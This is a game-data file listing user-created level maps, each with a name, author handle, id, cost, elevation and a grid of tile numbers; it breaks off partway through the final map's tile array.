maps.push({name="Orange",author="TF2 Pencil",id="#1663216399",direction="forward",cost=134,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,56,56,56,56,0,0,0,0,0,0,0,0,0,0,0,0,0,0,56,56,56,0,0,56,56,56,0,0,0,0,0,0,0,0,0,0,0,56,56,0,0,56,56,0,0,56,56,0,0,0,0,0,0,0,0,0,56,56,0,56,56,56,56,56,56,0,56,56,0,0,0,0,0,0,0,0,56,0,56,56,56,56,56,56,56,56,0,56,0,0,0,0,0,0,0,56,56,0,56,56,56,56,56,56,56,56,0,56,56,0,0,0,0,36,0,56,0,56,56,56,56,0,0,56,56,56,56,0,56,0,36,0,0,100,0,56,0,56,56,56,56,0,0,56,56,56,56,0,56,0,100,0,0,0,0,56,56,0,56,56,56,56,56,56,56,56,0,56,56,0,0,0,0,0,0,0,56,0,56,56,56,56,56,56,56,56,0,56,0,0,0,0,0,0,0,0,56,56,0,56,56,56,56,56,56,0,56,56,0,0,0,0,0,0,0,0,0,56,56,0,0,56,56,0,0,56,56,0,0,0,0,0,0,0,0,0,0,0,56,56,56,0,0,56,56,56,0,0,0,0,0,0,0,0,0,0,0,0,0,0,56,56,56,56,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="why did you trigger",author="alli",id="#1663227885",direction="forward",cost=165,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,35,36,37,38,39,39,39,39,0,0,0,0,0,0,0,0,0,0,14,14,15,16,17,18,19,19,19,39,0,0,0,43,43,43,0,0,0,0,14,14,15,16,17,18,19,19,19,39,0,0,0,43,93,43,0,0,0,0,14,14,35,36,37,38,19,19,19,39,0,0,0,43,23,43,0,0,0,0,14,14,0,0,0,1,96,96,96,1,0,0,0,43,93,43,0,0,0,0,14,14,0,0,0,1,19,19,19,1,0,0,0,43,23,43,0,0,0,0,14,14,0,0,0,39,19,19,19,39,0,0,0,43,93,43,0,0,0,0,14,14,0,0,0,39,19,94,19,39,0,0,0,43,23,43,0,0,0,0,14,14,0,0,0,39,19,19,19,39,0,0,0,43,43,43,0,0,0,0,14,14,0,0,0,39,19,94,19,39,0,0,0,40,20,40,0,0,0,0,14,14,0,0,0,39,19,19,19,39,0,0,0,40,97,40,0,0,0,0,14,14,0,0,0,39,19,94,19,39,0,0,0,40,20,40,0,0,0,0,14,14,0,0,0,39,19,19,19,39,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,39,39,39,39,39,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,20,0,18,0,16,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Matter of luck",author="Fara",id="#1663243830",direction="forward",cost=242,elevation=0,map=[0,0,0,0,0,0,14,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,0,94,94,14,14,0,0,0,0,0,0,14,14,14,14,14,144,144,144,144,0,94,14,14,14,0,0,1,0,0,0,0,14,14,14,14,144,144,144,144,0,0,0,14,14,14,14,96,14,14,14,14,14,14,14,14,144,144,144,144,0,0,0,14,14,14,14,96,14,14,14,14,14,14,14,14,144,144,144,144,0,93,14,14,14,0,0,1,0,0,0,0,14,14,14,14,144,144,144,144,0,93,93,14,14,0,0,0,0,0,0,14,14,14,14,14,144,144,144,144,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,2,2,14,0,0,0,0,0,0,0,0,0]});
maps.push({name="Shortcut v4",author="sivi",id="#1663244819",direction="left",cost=268,elevation=6,map=[0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,94,5,5,94,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,5,5,90,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,65,5,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,65,65,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,65,65,5,5,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,65,5,5,90,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,5,5,65,1,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,5,5,65,65,1,0,0,0,0,0,0,0,1,90,88,90,88,90,1,1,5,5,5,90,1,1,1,1,1,1,1,1,2,111,111,111,111,111,93,111,5,5,5,5,95,105,106,107,108,108,90,1,2,111,111,111,111,111,93,111,5,5,5,5,95,105,106,107,108,108,108,1,1,90,88,90,111,111,1,1,5,65,65,90,1,1,1,1,1,108,108,1,1,1,1,1,111,111,1,130,1,1,1,1,1,0,0,0,1,109,109,1,0,0,0,1,111,90,1,0,0,0,0,0,0,0,0,0,1,110,110,1,0,0,0,1,111,111,1,1,1,1,1,1,1,1,1,1,1,111,111,1,0,0,0,1,111,111,111,111,90,111,111,111,111,111,111,90,111,111,111,1,0,0,0,1,90,111,111,111,111,111,111,90,111,111,111,111,111,111,90,1,0,0,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="pools inside",author="Fara",id="#1663245161",direction="forward",cost=344,elevation=6,map=[0,0,0,1,1,1,1,114,2,2,114,1,1,1,1,0,0,0,0,0,0,0,0,1,54,54,54,54,54,90,54,54,54,54,1,0,0,0,0,0,0,0,0,1,54,90,54,54,54,54,54,54,89,90,1,0,0,0,0,0,0,0,0,1,54,54,20,90,54,54,54,20,54,54,1,0,0,0,0,0,0,0,0,1,54,54,89,65,65,65,65,54,54,54,1,0,0,0,0,0,0,0,0,1,54,54,54,65,65,65,65,54,54,54,1,0,0,0,0,0,0,0,0,1,54,90,54,65,65,65,65,54,90,54,1,1,1,1,0,0,0,0,0,1,54,54,54,65,65,65,65,54,54,54,20,19,19,18,1,0,0,0,0,1,90,54,54,65,65,65,65,54,54,54,20,19,18,18,18,1,0,0,0,1,54,54,90,65,65,65,65,90,89,54,20,19,18,17,17,1,0,0,0,1,54,54,54,65,65,65,65,20,54,54,1,1,1,17,17,1,0,0,0,1,54,90,20,89,14,14,14,14,90,14,14,15,16,17,17,1,0,0,0,1,54,54,54,14,14,14,14,14,14,14,14,15,16,16,17,1,0,0,0,1,54,54,54,14,14,90,14,14,14,14,14,15,16,16,1,0,0,0,0,1,90,54,54,65,65,65,65,90,14,90,1,1,1,1,0,0,0,0,0,1,54,89,54,65,65,65,65,14,14,14,1,0,0,0,0,0,0,0,0,1,54,54,54,65,65,65,65,14,14,14,1,0,0,0,0,0,0,0,0,1,54,54,90,65,65,65,65,14,14,14,1,0,0,0,0,0,0,0,0,1,120,120,54,65,65,65,65,14,14,90,1,0,0,0,0,0,0,0,0,1,2,2,1,1,1,1,1,1,1,1,1,0,0,0,0,0]});
maps.push({name="THE collective",author="chinny",id="#1663246705",direction="forward",cost=431,elevation=0,map=[0,0,0,0,0,0,0,120,120,2,2,120,120,0,0,0,0,0,0,0,0,0,0,0,0,0,120,123,123,123,123,123,123,122,119,0,0,0,0,0,0,0,0,0,122,123,123,123,46,76,0,76,123,123,122,122,119,0,0,0,0,0,0,122,123,123,123,46,0,0,0,76,76,123,123,123,122,119,0,0,0,0,120,123,123,91,46,0,24,70,74,24,0,0,76,123,123,120,119,0,0,122,123,123,91,76,0,24,72,66,66,70,24,0,0,76,123,123,119,0,0,122,123,91,76,0,24,70,66,24,93,66,70,24,0,0,76,123,119,0,122,123,123,91,0,24,70,66,24,72,73,24,66,73,24,0,76,123,122,119,120,123,91,0,24,70,66,65,73,1,1,72,65,66,70,24,0,123,122,119,120,123,91,119,73,66,24,73,1,1,1,1,73,24,66,70,0,123,120,119,122,123,91,0,74,66,94,73,1,1,1,1,72,94,66,70,0,123,120,119,122,123,91,0,24,74,66,24,72,1,1,73,24,66,74,24,76,123,120,119,122,123,123,91,0,24,70,66,24,73,72,65,66,72,24,0,0,123,122,119,0,120,123,91,76,76,24,70,66,93,24,66,73,24,0,76,76,123,119,0,0,120,123,123,91,76,0,24,74,66,66,70,24,0,0,76,123,123,119,0,0,0,120,123,123,91,46,0,0,73,73,24,0,0,76,123,123,120,119,0,0,0,0,122,123,123,123,46,76,0,0,76,76,123,123,123,122,119,0,0,0,0,0,0,122,120,123,123,46,76,119,84,123,123,120,122,119,0,0,0,0,0,0,0,0,0,120,123,123,123,123,123,123,122,119,0,0,0,0,0,0,0,0,0,0,0,0,120,120,2,2,120,120,0,0,0,0,0,0,0]});
maps.push({name="Just floor for mapea",author="Jando",id="#1663275844",direction="forward",cost=282,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0,15,15,15,18,18,18,15,15,18,18,18,15,15,18,18,18,15,15,0,0,15,18,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0,15,15,15,15,15,15,15,15,15,15,0,15,15,15,15,15,0,15,0,0,0,15,15,15,15,0,15,15,15,15,15,15,0,15,15,15,15,15,0,0,15,15,0,15,15,15,0,15,0,15,15,15,15,0,15,0,15,15,0,0,15,15,15,15,0,15,15,15,15,15,0,15,15,15,15,15,15,0,0,0,18,15,15,15,15,15,0,15,0,15,15,15,15,15,15,15,15,15,0,0,15,15,15,15,15,15,15,15,15,15,15,18,15,15,18,15,15,15,0,0,15,15,15,18,15,15,15,15,15,15,15,15,15,15,15,15,15,15,0,0,15,15,15,15,15,15,18,15,15,15,15,15,15,15,15,15,15,15,0,0,15,15,15,15,15,15,18,15,15,18,15,15,15,15,15,15,15,15,0,0,15,15,15,15,15,15,15,15,15,15,15,15,15,18,15,15,15,15,0,0,15,15,15,15,15,15,15,15,18,15,15,15,15,15,15,15,15,15,0,0,15,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Elevate Your Jump",author="sivi",id="#1663283025",direction="forward",cost=219,elevation=10,map=[0,0,0,0,0,0,0,0,5,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,5,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,1,1,90,92,5,92,5,92,90,1,1,0,0,0,0,0,0,0,0,0,1,9,9,9,9,9,9,9,9,9,1,0,0,0,0,0,0,0,0,0,1,91,90,12,12,12,12,12,90,91,1,0,0,0,0,0,0,0,0,0,1,9,12,12,93,93,93,12,12,9,1,0,0,0,0,0,0,0,0,0,1,9,12,12,12,12,12,12,12,9,1,0,0,0,0,0,0,0,0,0,1,91,90,11,13,13,13,11,90,91,1,0,0,0,0,0,0,0,0,0,1,9,12,10,14,14,14,10,12,9,1,0,0,0,0,0,0,0,0,0,1,85,12,9,15,15,15,9,12,85,1,0,0,0,0,0,0,0,0,0,1,9,12,9,15,15,15,9,12,9,1,0,0,0,0,0,0,0,0,0,1,91,90,9,90,15,90,9,90,91,1,0,0,0,0,0,0,0,0,0,1,9,12,9,15,15,15,9,12,9,1,0,0,0,0,0,0,0,0,0,1,9,12,9,15,15,15,9,12,9,1,0,0,0,0,0,0,0,0,0,1,91,90,139,90,15,90,139,90,91,1,0,0,0,0,0,0,0,0,0,1,9,139,9,15,15,15,9,139,9,1,0,0,0,0,0,0,0,0,0,1,1,1,1,15,2,2,1,1,1,1,0,0,0,0,0]});
maps.push({name="by the rivers of",author="chinny",id="#1663290341",direction="forward",cost=271,elevation=18,map=[0,0,0,0,0,0,0,46,2,2,46,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,46,46,46,46,0,0,0,0,0,0,0,0,0,0,0,0,0,0,47,47,47,46,46,47,47,47,0,0,0,0,0,0,0,0,0,0,0,47,85,47,47,46,46,47,47,47,47,0,0,0,0,0,0,0,0,47,47,47,85,47,47,46,46,47,85,47,85,47,47,0,0,0,0,0,48,48,47,47,47,47,47,52,52,47,47,47,47,47,48,48,0,0,0,48,48,48,48,48,1,1,52,52,52,52,1,1,1,48,48,48,48,0,0,48,85,48,48,1,1,1,95,95,95,95,1,1,1,1,48,85,48,0,0,49,49,49,1,1,18,18,52,52,52,52,18,18,1,1,49,49,49,0,0,0,0,0,1,1,141,1,52,52,85,52,1,4,1,1,0,0,0,0,0,0,0,0,1,131,24,1,52,52,52,52,1,24,131,1,0,0,0,0,0,49,49,49,1,1,1,1,52,85,52,52,1,1,1,1,49,49,49,0,0,50,50,50,1,1,1,1,52,52,52,52,1,1,1,1,50,50,50,0,0,50,50,50,50,1,1,1,52,52,52,52,1,1,1,50,50,85,50,0,0,0,50,85,50,50,51,51,52,52,52,52,51,51,50,50,50,50,0,0,0,0,0,50,50,51,51,51,52,52,52,52,51,51,51,50,50,0,0,0,0,0,0,0,51,51,51,51,52,52,52,52,51,85,51,51,0,0,0,0,0,0,0,0,0,0,51,51,52,52,52,52,51,51,51,0,0,0,0,0,0,0,0,0,0,0,1,132,44,44,44,44,132,1,0,0,0,0,0,0,0,0,0,0,0,0,1,44,44,2,2,44,44,1,0,0,0,0,0,0,0]});
maps.push({name="dont be tempted",author="chinny",id="#1663290369",direction="forward",cost=208,elevation=0,map=[0,0,0,0,0,0,24,24,2,2,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,94,24,24,94,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,24,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,24,58,58,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,58,93,93,58,24,0,0,0,0,0,0,0,0,0,0,0,42,42,0,24,58,93,93,58,24,0,42,42,0,0,0,0,0,0,0,0,42,42,0,24,58,93,93,58,24,0,42,42,0,0,0,0,0,0,0,0,0,0,0,44,44,44,44,44,44,0,0,0,0,0,0,0,0,0,0,40,40,0,0,96,96,96,96,96,96,0,0,40,40,0,0,0,0,0,0,40,40,0,0,96,24,135,135,24,96,0,0,40,40,0,0,0,0,0,0,40,40,0,0,24,88,135,135,88,24,0,0,40,40,0,0,0,0,0,0,40,40,0,0,88,88,135,135,88,88,0,0,40,40,0,0,0,0,0,0,0,0,0,0,24,24,135,135,24,24,0,0,0,0,0,0,0,0,0,0,0,38,38,0,24,24,58,58,24,24,0,38,38,0,0,0,0,0,0,0,0,38,38,0,24,24,126,126,24,24,0,38,38,0,0,0,0,0,0,0,0,38,38,38,24,24,58,58,24,24,38,38,38,0,0,0,0,0,0,0,0,0,38,38,38,38,58,58,38,38,38,38,0,0,0,0,0,0,0,0,0,1,24,24,38,125,24,24,125,38,24,24,1,0,0,0,0,0,0,0,0,1,1,97,24,24,2,2,24,24,97,1,1,0,0,0,0,0]});
maps.push({name="Prayge",author="ZpLit",id="#1663300686",direction="forward",cost=212,elevation=0,map=[0,0,0,0,0,0,0,20,54,2,2,54,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,54,54,54,54,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,54,54,54,54,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,54,54,54,54,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,54,54,54,54,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,54,54,54,54,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,54,54,54,54,20,0,0,0,0,0,0,0,14,14,14,14,0,0,0,20,54,54,54,54,20,0,0,0,0,14,14,14,14,93,93,14,1,0,0,20,54,54,54,54,20,0,0,0,0,14,94,14,14,93,93,14,14,96,14,14,54,54,54,54,144,144,144,144,144,14,94,14,14,93,93,14,14,96,14,14,54,54,54,54,144,144,144,144,144,14,94,14,14,93,93,14,1,0,0,20,54,54,54,54,20,0,0,0,0,14,94,14,14,14,14,14,0,0,0,20,54,54,54,54,20,0,0,0,0,14,14,14,0,0,0,0,0,0,0,20,54,54,54,54,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,54,54,54,54,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,54,54,54,54,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,54,54,54,54,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,54,54,54,54,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,54,54,54,54,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,88,2,2,88,20,0,0,0,0,0,0,0]});
maps.push({name="Shortcut v5",author="sivi",id="#1663347660",direction="left",cost=261,elevation=3,map=[1,1,1,1,1,1,1,1,5,2,2,5,0,0,0,0,0,0,0,0,1,90,93,93,90,1,1,1,5,5,5,5,0,0,0,0,0,0,0,0,1,108,108,108,108,108,5,5,5,5,5,94,0,0,0,0,0,0,0,0,2,108,108,108,108,108,5,97,5,5,5,94,0,0,0,0,0,0,0,0,2,108,108,108,108,108,5,5,5,5,5,5,0,0,0,0,0,0,0,0,1,90,108,108,90,1,1,1,1,105,105,1,1,0,0,0,0,0,0,0,1,108,108,108,108,1,0,0,1,96,96,1,1,0,0,0,0,0,0,0,1,107,107,107,107,1,0,1,1,105,105,1,1,0,0,0,0,0,0,0,1,90,107,107,90,1,0,1,105,105,105,105,1,0,0,0,0,0,0,0,1,107,107,107,107,1,0,1,91,91,91,91,1,0,0,0,0,0,0,0,1,106,106,106,106,1,0,1,105,105,105,105,1,0,0,0,0,0,0,0,1,90,106,106,90,1,0,1,91,91,91,91,1,0,0,0,0,0,0,0,1,106,106,106,106,1,0,1,105,105,105,105,1,0,0,0,0,0,0,0,1,105,105,105,105,1,1,1,91,91,91,91,1,0,0,0,0,0,0,0,1,105,105,105,105,91,105,91,105,105,105,105,1,0,0,0,0,0,0,0,1,105,105,87,105,91,105,91,105,87,105,105,1,0,0,0,0,0,0,0,1,1,88,105,105,91,105,91,105,105,88,1,1,0,0,0,0,0,0,0,0,1,1,105,105,91,105,91,105,105,1,1,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Russian B",author="ZpLit",id="#1663348272",direction="forward",cost=163,elevation=-2,map=[0,0,0,0,0,0,0,0,20,2,2,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,20,54,54,20,22,0,0,0,0,0,0,0,0,0,0,0,0,0,21,99,20,90,54,20,99,21,0,0,0,0,0,0,0,0,0,0,0,0,20,54,20,54,54,20,54,20,0,0,0,0,0,0,0,0,0,0,0,0,20,54,96,54,54,96,54,20,0,0,0,0,0,0,0,0,0,0,0,0,20,54,20,54,90,20,54,20,0,0,0,0,0,0,0,0,0,0,0,0,20,54,20,54,54,20,54,20,0,0,0,0,0,0,0,0,0,0,0,0,20,54,20,54,54,20,54,20,0,0,0,0,0,0,0,0,0,0,0,0,20,54,96,54,54,96,54,20,0,0,0,0,0,0,0,0,0,0,0,0,20,54,20,97,54,20,54,20,0,0,0,0,0,0,0,0,0,0,0,0,20,54,20,54,54,20,54,20,0,0,0,0,0,0,0,0,0,0,0,0,20,54,20,90,90,20,54,20,0,0,0,0,0,0,0,0,0,0,0,0,20,54,20,103,103,20,54,20,0,0,0,0,0,0,0,0,0,0,0,0,20,54,20,54,54,20,54,20,0,0,0,0,0,0,0,0,0,0,0,0,20,54,98,54,54,98,54,20,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,54,54,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,53,53,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,52,52,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,52,52,52,52,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,88,2,2,88,18,0,0,0,0,0,0,0]});
maps.push({name="ez stage",author="Tenzist",id="#1663354425",direction="forward",cost=126,elevation=4,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,38,37,36,15,15,36,37,38,0,0,0,0,0,0,0,0,0,0,0,0,39,0,0,35,35,0,0,39,0,0,0,0,0,0,0,0,0,0,0,0,40,0,0,36,36,0,0,40,0,0,0,0,0,0,0,0,0,0,0,0,41,42,43,57,57,43,42,41,0,0,0,0,0,0,0,0,0,0,0,0,135,0,0,118,118,0,0,135,0,0,0,0,0,0,0,0,0,0,0,0,135,0,0,57,57,0,0,135,0,0,0,0,0,0,0,0,0,0,0,0,135,0,0,36,36,0,0,135,0,0,0,0,0,0,0,0,0,0,0,0,135,0,55,55,55,55,0,135,0,0,0,0,0,0,0,0,0,0,0,0,135,0,14,1,1,14,0,135,0,0,0,0,0,0,0,0,0,0,0,0,135,0,55,55,55,55,0,135,0,0,0,0,0,0,0,0,0,0,0,0,135,0,0,56,56,0,0,135,0,0,0,0,0,0,0,0,0,0,0,0,135,41,1,117,117,1,41,135,0,0,0,0,0,0,0,0,0,0,0,0,14,0,1,116,116,1,0,14,0,0,0,0,0,0,0,0,0,0,0,0,15,14,55,35,35,55,14,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,56,56,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,0,1,17,17,1,0,35,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,58,58,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,36,37,0,39,39,0,37,36,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0]});
maps.push({name="Hold W",author="sivi",id="#1663369837",direction="forward",cost=200,elevation=1,map=[0,0,0,0,0,0,0,24,24,2,2,24,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,94,9,9,94,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,9,9,9,9,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,10,10,10,10,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,127,127,127,127,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,0,0,0,0,24,0,0,0,0,0,0,0,0,0,0,0,0,0,0,24,0,0,0,0,24,0,0,0,0,0,0,0,0,0,0,0,0,24,24,24,0,0,0,0,24,24,24,0,0,0,0,0,0,0,0,0,0,139,127,0,0,0,0,0,0,127,139,0,0,0,0,0,0,0,0,0,0,24,14,0,0,0,0,0,0,14,24,0,0,0,0,0,0,0,0,0,0,24,10,10,10,10,10,10,10,10,24,0,0,0,0,0,0,0,0,0,0,24,10,10,10,10,10,10,10,10,24,0,0,0,0,0,0,0,0,0,0,24,90,10,10,10,10,10,10,90,24,0,0,0,0,0,0,0,0,24,24,24,88,10,10,10,10,10,10,88,24,24,24,0,0,0,0,0,0,139,90,16,90,10,10,10,10,10,10,90,16,90,139,0,0,0,0,0,0,24,93,16,88,10,10,10,10,10,10,88,16,93,24,0,0,0,0,0,0,139,90,16,90,10,10,10,10,10,10,90,16,90,139,0,0,0,0,0,0,24,24,24,88,10,10,10,10,10,10,88,24,24,24,0,0,0,0,0,0,0,0,24,90,10,10,10,10,10,10,90,24,0,0,0,0,0,0,0,0,0,0,24,139,24,10,2,2,10,24,139,24,0,0,0,0,0]});
maps.push({name="Wall Strafes",author="sivi",id="#1663377932",direction="forward",cost=203,elevation=0,map=[1,90,2,2,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,5,5,5,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,5,5,90,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,1,5,5,5,5,0,0,0,0,139,93,131,1,0,0,0,0,0,0,0,1,5,5,5,5,0,0,0,0,5,24,24,1,0,0,0,0,0,0,0,1,5,5,5,5,0,0,0,0,5,100,24,1,0,0,0,0,0,0,0,1,90,5,5,90,0,0,0,0,5,65,24,1,0,0,0,0,0,0,0,1,5,5,5,5,0,0,0,0,5,65,1,1,0,0,0,0,0,0,0,1,5,5,5,5,0,0,0,0,5,65,65,1,0,0,0,0,0,0,0,1,5,5,5,5,0,0,0,0,5,65,125,1,0,0,0,0,0,0,0,1,90,5,5,90,0,0,0,0,5,65,14,1,0,0,0,0,0,0,0,1,5,5,5,5,0,0,0,0,5,65,14,1,0,0,0,0,0,0,0,1,5,5,5,5,0,0,0,0,5,65,1,1,0,0,0,0,0,0,0,1,5,5,5,5,0,0,0,0,5,5,5,1,0,0,0,0,0,0,0,1,90,5,5,90,0,0,0,0,5,5,125,1,0,0,0,0,0,0,0,1,5,5,5,5,5,5,5,5,5,5,5,1,0,0,0,0,0,0,0,1,132,5,5,5,5,5,5,5,5,5,5,1,0,0,0,0,0,0,0,1,1,2,2,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0]});
maps.push({name="Strawberry",author="TF2 Pencil",id="#1663392447",direction="forward",cost=222,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,129,129,0,0,0,118,118,118,118,118,118,0,0,38,0,38,100,0,0,0,129,129,129,0,118,118,38,118,38,118,118,118,0,0,0,0,0,0,0,0,0,129,129,118,118,118,118,118,118,118,38,118,118,0,0,0,0,0,0,0,0,0,129,118,38,118,118,118,118,118,118,118,118,118,0,0,0,0,0,0,0,0,129,118,118,118,38,118,38,118,118,118,38,118,118,0,0,0,0,129,129,129,129,118,118,118,118,118,118,118,38,118,118,118,118,118,0,0,0,129,0,129,129,118,38,118,118,118,118,118,118,118,118,118,38,118,0,0,0,129,0,0,129,118,118,118,38,118,38,118,118,118,38,118,118,0,0,0,0,0,0,0,129,118,118,118,118,118,118,118,118,118,118,118,0,0,0,0,0,0,0,129,129,118,38,118,118,118,118,118,38,118,118,0,0,0,0,0,0,0,129,129,129,0,118,118,38,118,38,118,118,118,0,0,0,0,0,0,0,0,129,129,0,0,0,118,118,118,118,118,118,0,0,38,0,38,100,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Lemon",author="TF2 Pencil",id="#1663392470",direction="forward",cost=152,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,0,0,0,0,0,0,0,0,0,0,19,100,0,0,0,0,0,39,39,39,39,0,0,0,0,0,100,19,0,0,0,0,0,0,0,0,39,39,39,39,39,39,0,0,0,0,0,0,0,0,0,0,0,0,0,39,39,39,39,39,39,39,39,0,0,0,0,0,0,0,19,0,0,0,39,39,39,39,39,39,39,39,39,39,0,0,0,19,0,0,0,0,0,0,39,39,39,39,39,39,39,39,39,39,0,0,0,0,0,0,0,0,0,0,39,39,39,39,39,39,39,39,39,39,0,0,0,0,0,0,19,0,19,0,39,39,39,39,39,39,39,39,39,39,0,19,0,19,0,0,19,0,19,0,39,39,39,39,39,39,39,39,39,39,0,19,0,19,0,0,0,0,0,0,39,39,39,39,39,39,39,39,39,39,0,0,0,0,0,0,0,0,0,0,39,3